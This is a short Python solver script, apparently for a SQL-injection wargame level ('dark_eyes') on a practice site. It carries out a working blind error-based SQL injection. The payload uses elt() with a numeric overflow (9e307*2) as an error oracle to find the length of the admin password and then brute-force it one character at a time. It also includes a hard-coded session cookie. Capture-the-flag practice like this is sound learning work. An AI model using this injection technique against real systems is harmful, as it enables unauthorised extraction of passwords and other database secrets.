import requests
from string import ascii_letters, digits

url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
cookie = { "PHPSESSID" : "kuub3vrumkl72qvd78q76q93fg" }
string = ascii_letters + digits
default = "' or elt(id='admin' and "

def GET(params):
    if len(requests.get(url, params, cookies=cookie).text) == 0 : return True
    return False

length = 0
while True:
    if GET({"pw": default + f"length(pw)={length}, 9e307*2,1)#"}):break
    length += 1

pw = ""
for i in range(1, length+1):
    for s in string:
        if GET({"pw": default + f"mid(pw,{i},1)='{s}', 9e307*2,1)#"}):
            pw += s
            break

if requests.get(url,{"pw":pw},cookies=cookie).text.find("Clear!") > 0 : print("[*] Success")
